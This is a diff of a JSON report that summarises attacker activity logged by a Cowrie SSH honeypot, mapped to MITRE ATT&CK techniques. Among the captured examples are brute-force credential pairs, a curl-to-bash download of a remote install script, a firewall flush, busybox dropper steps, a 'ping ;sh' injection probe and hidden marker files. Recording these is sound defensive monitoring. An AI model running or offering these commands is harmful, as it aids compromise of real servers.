@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 02:02:06",
+  "generated": "2026-08-29 03:01:10",
   "totals": {
-    "commands": 17,
-    "login_failed": 53,
-    "login_success": 7,
-    "sessions": 65
+    "commands": 88,
+    "login_failed": 168,
+    "login_success": 12,
+    "sessions": 185
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 53,
+      "count": 168,
       "examples": [
         "ubuntu / Abdullah1234@",
         "root / Admin999",
@@ -21,14 +21,27 @@
         "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T02:01:44.780899Z",
-      "unique_ips": 12
+      "last": "2026-08-29T02:55:58.418849Z",
+      "unique_ips": 16
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 15,
+      "examples": [
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
+      ],
+      "first": "2026-08-29T00:23:05.332392Z",
+      "last": "2026-08-29T02:50:30.801017Z",
+      "unique_ips": 2
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 7,
+      "count": 12,
       "examples": [
         "root / 123@@@",
         "ubuntu / ubuntu",
@@ -37,8 +50,8 @@
         "admin / 12345"
       ],
       "first": "2026-08-29T00:22:29.262232Z",
-      "last": "2026-08-29T01:48:57.320748Z",
-      "unique_ips": 6
+      "last": "2026-08-29T02:49:32.075635Z",
+      "unique_ips": 8
     },
     {
       "id": "T1082",
@@ -53,67 +66,110 @@
       "unique_ips": 2
     },
     {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
       "count": 2,
       "examples": [
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
+        "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx"
       ],
-      "first": "2026-08-29T00:23:05.332392Z",
-      "last": "2026-08-29T00:23:05.594423Z",
+      "first": "2026-08-29T02:21:36.689252Z",
+      "last": "2026-08-29T02:21:38.189361Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "iptables -F"
+      ],
+      "first": "2026-08-29T02:50:27.775961Z",
+      "last": "2026-08-29T02:50:27.775961Z",
       "unique_ips": 1
     }
   ],
   "unmapped": [
     [
+      "enable",
+      4
+    ],
+    [
+      "system",
+      4
+    ],
+    [
+      "shell",
+      4
+    ],
+    [
+      "sh",
+      4
+    ],
+    [
+      "linuxshell",
+      4
+    ],
+    [
+      "/bin/busybox",
+      3
+    ],
+    [
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+      2
+    ],
+    [
+      "python3 /tmp/bendi.py",
+      2
+    ],
+    [
+      "rm /tmp/bendi.py",
+      2
+    ],
+    [
+      "ping ;sh",
+      2
+    ],
+    [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       2
     ],
     [
-      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-      1
+      ">/tmp/.codi && cd /tmp/",
+      2
     ],
     [
-      "python3 /tmp/bendi.py",
-      1
+      ">/var/.codi && cd /var/",
+      2
     ],
     [
-      "rm /tmp/bendi.py",
-      1
+      ">/dev/.codi && cd /dev/",
+      2
     ],
     [
-      "enable",
-      1
+      ">/mnt/.codi && cd /mnt/",
+      2
     ],
     [
-      "system",
-      1
+      ">/var/run/.codi && cd /var/run/",
+      2
     ],
     [
-      "shell",
-      1
+      ">/var/tmp/.codi && cd /var/tmp/",
+      2
     ],
     [
-      "sh",
-      1
+      ">/.codi && cd /",
+      2
     ],
     [
-      "linuxshell",
-      1
+      ">/dev/netslink/.codi && cd /dev/netslink/",
+      2
     ],
     [
-      "enablelinuxshell",
-      1
-    ],
-    [
-      "ping ;sh",
-      1
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      1
+      ">/dev/shm/.codi && cd /dev/shm/",
+      2
     ]
   ]
 }
